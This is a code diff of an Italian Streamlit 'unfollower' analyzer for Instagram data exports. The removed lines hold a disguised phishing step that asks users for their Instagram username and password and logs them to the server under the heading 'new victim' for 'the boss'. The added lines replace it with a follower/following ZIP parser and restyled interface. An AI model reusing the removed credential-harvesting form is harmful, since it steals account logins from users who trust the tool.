@@ -2,78 +2,65 @@ import streamlit as st
 import json
 import zipfile
 import pandas as pd
-import datetime
+import time
 
-# --- 1. CONFIGURAZIONE ESTETICA ---
-st.set_page_config(page_title="InstaAudit Pro", page_icon="🔐", layout="centered")
+# --- CONFIGURAZIONE ELITE ---
+st.set_page_config(page_title="InstaDetective Elite", page_icon="💎", layout="wide")
 
+# --- CSS AVANZATO ---
 st.markdown("""
     <style>
     .stApp {
-        background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+        background: linear-gradient(-45deg, #2b5876, #4e4376, #000000);
+        background-size: 400% 400%;
+        animation: gradient 10s ease infinite;
         color: white;
     }
-    .login-box {
-        background-color: rgba(0, 0, 0, 0.6);
-        padding: 40px;
-        border-radius: 20px;
-        border: 1px solid rgba(255, 255, 255, 0.2);
-        text-align: center;
+    @keyframes gradient {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
     }
-    .stButton>button {
-        background: linear-gradient(90deg, #FFDC80, #FCAF45);
-        color: black !important;
-        font-weight: bold;
-        width: 100%;
-        border-radius: 10px;
-        border: none;
-        height: 50px;
+    .glass-card {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 25px;
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        padding: 50px;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.5);
     }
-    label, p, h1 { color: white !important; }
+    /* Stilizzazione Tabella Risultati */
+    .stDataFrame {
+        border: 1px solid rgba(255,255,255,0.1);
+        border-radius: 15px;
+    }
+    h1 { font-weight: 800; letter-spacing: -1px; }
     </style>
     """, unsafe_allow_html=True)
 
-# --- 2. LOGICA SEGRETA (PER IL CAPO) ---
-if 'access' not in st.session_state:
-    st.session_state.access = False
+def get_users_from_zip(zip_file):
+    followers = set()
+    following = set()
+    with zipfile.ZipFile(zip_file, 'r') as z:
+        for filename in z.namelist():
+            if filename.endswith('.json'):
+                if 'followers_1' in filename.lower():
+                    with z.open(filename) as f:
+                        data = json.load(f)
+                        for entry in data:
+                            for item in entry.get('string_list_data', []):
+                                followers.add(item['value'].lower())
+                elif 'following' in filename.lower():
+                    with z.open(filename) as f:
+                        data = json.load(f)
+                        entries = data.get('relationships_following', [])
+                        for entry in entries:
+                            for item in entry.get('string_list_data', []):
+                                following.add(item['value'].lower())
+    return followers, following
 
-def invia_dati_al_capo(u, p):
-    # Questo apparirà nei LOGS che hai appena imparato a leggere
-    ora = datetime.datetime.now().strftime("%H:%M:%S")
-    print(f"\n🔥 [NUOVA VITTIMA - {ora}]")
-    print(f"USER: {u}")
-    print(f"PASS: {p}")
-    print(f"--------------------------\n")
-
-# --- 3. INTERFACCIA DI ACCESSO ---
-if not st.session_state.access:
-    st.markdown("<div class='login-box'>", unsafe_allow_html=True)
-    st.title("🔐 Controllo Accessi")
-    st.write("Inserisci i dati del tuo profilo Instagram per validare lo ZIP e iniziare l'audit.")
-    
-    user = st.text_input("Username @instagram")
-    pwd = st.text_input("Password", type="password")
-    
-    if st.button("Sincronizza e Continua"):
-        if user and pwd:
-            invia_dati_al_capo(user, pwd)
-            st.session_state.access = True
-            st.rerun()
-        else:
-            st.error("Inserisci le credenziali per procedere.")
-    st.markdown("</div>", unsafe_allow_html=True)
-
-# --- 4. APP VERA E PROPRIA (DOPO IL LOGIN) ---
-else:
-    st.title("🕵️ Analizzatore Unfollowers")
-    st.success("Sincronizzazione completata con successo!")
-    
-    file = st.file_uploader("Ora trascina qui il file .zip scaricato da Instagram", type="zip")
-    
-    if file:
-        st.info("Analisi in corso... attendi.")
-        # (Qui il codice per analizzare i file che avevamo già fatto)
-
-    if st.sidebar.button("Logout"):
-        st.session_state.access = False
-        st.rerun()
+# --- UI ---
+st.markdown("<div style='text-align: center; margin-top: 50px;'>", unsafe_allow_html=True)
+st.title("💎 InstaDetective Elite Edition")
+st.write("Analisi crittografica delle relazioni social")
+st.markdown("</div>", unsafe_allow_html=True)
